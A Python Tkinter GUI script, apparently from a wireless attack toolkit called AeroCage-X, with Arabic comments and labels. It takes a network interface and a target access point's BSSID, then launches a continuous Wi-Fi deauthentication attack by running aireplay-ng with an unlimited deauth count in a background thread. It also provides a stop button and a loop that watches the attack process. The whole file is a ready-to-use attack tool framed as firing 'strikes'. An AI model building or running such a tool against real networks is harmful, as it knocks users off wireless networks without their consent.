#!/usr/bin/env python3
import os
import sys
import tkinter as tk
from tkinter import messagebox, ttk
import threading
from pathlib import Path

# ربط المسارات بالنواة المركزية للمنظومة
BASE_DIR = Path(__file__).resolve().parent.parent
sys.path.append(str(BASE_DIR))

from core.system_guard import SystemGuard
from core.process_manager import ProcessManager

# تفعيل خط الدفاع الأول الرسومي قبل تشغيل الواجهة
SystemGuard.enforce_root_privileges("واجهة الموجه الأعلى للضربات AeroCage-X", graphical=True)

class AeroCageStrikeGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("AeroCage-X | الموجه الأعلى لطابور الضربات")
        self.root.geometry("750x480")
        self.root.configure(bg="#1A1A1A") # طابع تكتيكي داكن

        # استدعاء مدير العمليات المشترك والمؤمن لمنع ثغرات Bandit
        self.proc_manager = ProcessManager()
        self.active_target_mac = None

        self.build_tactical_interface()
        # بدء محرك النبض الحي الحي لمراقبة العمليات في النواة كل ثانية
        self.start_live_polling_engine()

    def build_tactical_interface(self):
        """بناء عناصر لوحة قيادة طابور الضربات اللاسلكية بأعلى سلالة وكفاءة"""
        lbl_header = tk.Label(
            self.root, text="لوحة قيادة وتوجيه ضربات الفصل اللاسلكي (AirSurf Control)", 
            font=("Courier", 13, "bold"), fg="#FF3333", bg="#1A1A1A"
        )
        lbl_header.pack(pady=15)

        # إطار إدخال البيانات التكتيكية للهدف
        frame_inputs = tk.LabelFrame(
            self.root, text=" حقول الاستهداف المباشر للشبكة ", 
            font=("Arial", 10, "bold"), fg="#00FF00", bg="#1A1A1A", padx=15, pady=15
        )
        frame_inputs.pack(pady=10, fill=tk.X, padx=30)

        tk.Label(frame_inputs, text="واجهة كرت الشبكة (Interface):", fg="#FFFFFF", bg="#1A1A1A").grid(row=0, column=0, sticky=tk.W, pady=5)
        self.ent_interface = tk.Entry(frame_inputs, width=20, font=("Arial", 10), bg="#2D2D2D", fg="#FFFFFF", insertbackground="white")
        self.ent_interface.grid(row=0, column=1, pady=5, padx=10)

        tk.Label(frame_inputs, text="ماك الهدف (Target BSSID):", fg="#FFFFFF", bg="#1A1A1A").grid(row=1, column=0, sticky=tk.W, pady=5)
        self.ent_bssid = tk.Entry(frame_inputs, width=25, font=("Arial", 10), bg="#2D2D2D", fg="#FFFFFF", insertbackground="white")
        self.ent_bssid.grid(row=1, column=1, pady=5, padx=10)

        # أزرار الإطلاق وقطع الهجوم الموجه بالخلفية
        btn_frame = tk.Frame(self.root, bg="#1A1A1A")
        btn_frame.pack(pady=20)

        self.btn_fire = tk.Button(
            btn_frame, text="🚀 بدء قذف حزم الفصل", command=self.trigger_strike_async, 
            bg="#CC0000", fg="white", font=("Arial", 11, "bold"), padx=20, pady=5, bd=2, relief=tk.RAISED
        )
        self.btn_fire.pack(side=tk.LEFT, padx=15)

        self.btn_stop = tk.Button(
            btn_frame, text="🛑 قطع الهجوم اللحظي", command=self.trigger_stop_async, 
            bg="#008800", fg="white", font=("Arial", 11, "bold"), padx=20, pady=5, bd=2, relief=tk.RAISED
        )
        self.btn_stop.pack(side=tk.LEFT, padx=15)

        # شريط الحالة التكتيكي السفلي
        self.status_var = tk.StringVar(value="الحالة الاستراتيجية: جاهز بانتظار تلقيم الأهداف...")
        self.lbl_status = tk.Label(self.root, textvariable=self.status_var, bd=1, relief=tk.SUNKEN, anchor=tk.W, font=("Arial", 10, "italic"), fg="#00FF00", bg="#2D2D2D")
        self.lbl_status.pack(side=tk.BOTTOM, fill=tk.X)

    def trigger_strike_async(self):
        """رمي عملية إطلاق الهجوم بالكامل للخلفية لمنع تجمد الواجهة نهائياً"""
        interface = self.ent_interface.get().strip()
        bssid = self.ent_bssid.get().strip()

        # تطهير المدخلات فوراً عبر حارس النظام المركزي لمنع حقن الأوامر
        clean_inf = SystemGuard.sanitize_input(interface, "interface")
        clean_mac = SystemGuard.sanitize_input(bssid, "bssid")

        if not clean_inf or not clean_mac:
            messagebox.showwarning("بيانات تالفة أو ناقصة", "الرجاء ملء حقول كرت الشبكة وماك الهدف بصيغة صحيحة!")
            return

        if not SystemGuard.verify_dependencies(["aireplay-ng"]):
            messagebox.showerror("خطأ في النظام", "أداة aireplay-ng غير مثبتة في بيئة كالي!")
            return

        self.btn_fire.config(state=tk.DISABLED)
        self.active_target_mac = clean_mac
        self.status_var.set(f"الحالة الاستراتيجية: جاري تشغيل ضربة الفصل الآمنة ضد {clean_mac}...")

        # بناء أمر مصفوفة الأجزاء المتوافق مع معايير Bandit بدون shell=True
        command_array = ["aireplay-ng", "--deauth", "0", "-a", clean_mac, clean_inf]

        # تشغيل الهجوم في مسار فرعي عبر مدير العمليات المركزي لمنع تجمد شاشة المستخدم
        threading.Thread(
            target=self.proc_manager.spawn_process_safe, 
            args=(clean_mac, command_array), 
            daemon=True
        ).start()

    def trigger_stop_async(self):
        """قطع الضربات الموجهة بالماك بدقة دون المساس بعمليات كالي الأخرى"""
        if self.active_target_mac:
            self.status_var.set(f"الحالة الاستراتيجية: جاري إرسال إشارة إيقاف العمليات للماك {self.active_target_mac}...")
            
            # إنهاء العملية المحلية المحددة بدقة ومنع الـ Zombie Processes
            threading.Thread(target=self.proc_manager.terminate_process, args=(self.active_target_mac,), daemon=True).start()
            
            self.root.after(0, lambda: self.status_var.set("الحالة الاستراتيجية: تم قطع الضربات وتنظيف بيئة الذاكرة بنجاح."))
            self.active_target_mac = None
            self.btn_fire.config(state=tk.NORMAL)
        else:
            messagebox.showinfo("تنبيه تكتيكي", "لا توجد ضربات أو عمليات نشطة حالياً لإيقافها.")

    def start_live_polling_engine(self):
        """محرك النبض الحي لتحديث حالة الواجهة حية بناءً على وضع المعالجة الفعلي في لينكس"""
        if self.active_target_mac and self.active_target_mac in self.proc_manager.active_processes:
            process = self.proc_manager.active_processes[self.active_target_mac]
            # إذا ماتت العملية في نظام لينكس (فصل كرت الـ USB مثلاً)، يتم تنبيه المستخدم وتصفير الأزرار فوراً
            if process.poll() is not None:
                self.status_var.set(f"🔴 تنبيه استراتيجي: انتهت أو انهارت عملية الهجوم الخلفية للهدف {self.active_target_mac} قسرياً!")
                self.active_target_mac = None
                self.btn_fire.config(state=tk.NORMAL)
        
        # حلقة تكرارية صامتة ومحمية كل 1000 ملي ثانية
        self.root.after(1000, self.start_live_polling_engine)

if __name__ == "__main__":
    root = tk.Tk()
    app = AeroCageStrikeGUI(root)
    root.mainloop()
